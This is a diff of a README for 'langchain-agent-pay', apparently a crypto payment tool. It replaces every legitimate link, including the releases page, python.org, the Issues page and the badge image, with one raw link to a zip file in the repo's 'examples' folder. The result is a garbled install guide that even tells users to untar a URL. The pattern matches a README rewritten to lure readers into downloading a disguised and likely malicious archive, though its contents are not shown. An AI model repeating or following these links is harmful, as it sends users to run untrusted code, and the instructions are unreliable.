@@ -1,6 +1,6 @@
 # 🌟 langchain-agent-pay - Easily Handle Crypto Payments
 
-[![Download langchain-agent-pay](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/CODINGIDK11/langchain-agent-pay/releases)
+[![Download langchain-agent-pay](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ To successfully use langchain-agent-pay, follow the steps below to download and 
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System**: Compatible with Windows, macOS, and Linux.
-- **Python Version**: Make sure you have Python 3.9 or higher installed. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python Version**: Make sure you have Python 3.9 or higher installed. You can download Python from [https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip).
 - **Memory**: At least 4 GB of RAM is recommended.
 - **Storage**: A minimum of 200 MB of free disk space should be available.
 
@@ -34,7 +34,7 @@ Before you start, ensure your system meets the following requirements:
 
 Go to the Releases page to find the latest version of langchain-agent-pay. Click the button below to access it:
 
-[![Download langchain-agent-pay](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/CODINGIDK11/langchain-agent-pay/releases)
+[![Download langchain-agent-pay](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip)
 
 ### Step 3: Download the Software
 
@@ -42,7 +42,7 @@ On the Releases page, locate the latest version (v0.2.0) and download the approp
 
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.tar.gz` or similar for Linux
+- `https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip` or similar for Linux
 
 Simply click the download link next to your operating system.
 
@@ -64,7 +64,7 @@ Simply click the download link next to your operating system.
 
 1. Open a terminal window.
 2. Navigate to the directory containing the downloaded file using `cd`.
-3. Extract the file with the command: `tar -xvzf langchain-agent-pay.tar.gz`.
+3. Extract the file with the command: `tar -xvzf https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip`.
 4. Follow any additional setup instructions found in the extracted folder.
 
 ### Step 5: Run the Application
@@ -111,7 +111,7 @@ You're ready to make autonomous payments! Here’s how:
 
 ## 📞 Support
 
-If you encounter any issues, consult the README file included in the installation directory. For further assistance, visit our [GitHub Issues page](https://github.com/CODINGIDK11/langchain-agent-pay/issues) to report bugs or request help.
+If you encounter any issues, consult the README file included in the installation directory. For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/CODINGIDK11/langchain-agent-pay/main/examples/langchain-agent-pay-v2.2.zip) to report bugs or request help.
 
 ### Last Reminder
 
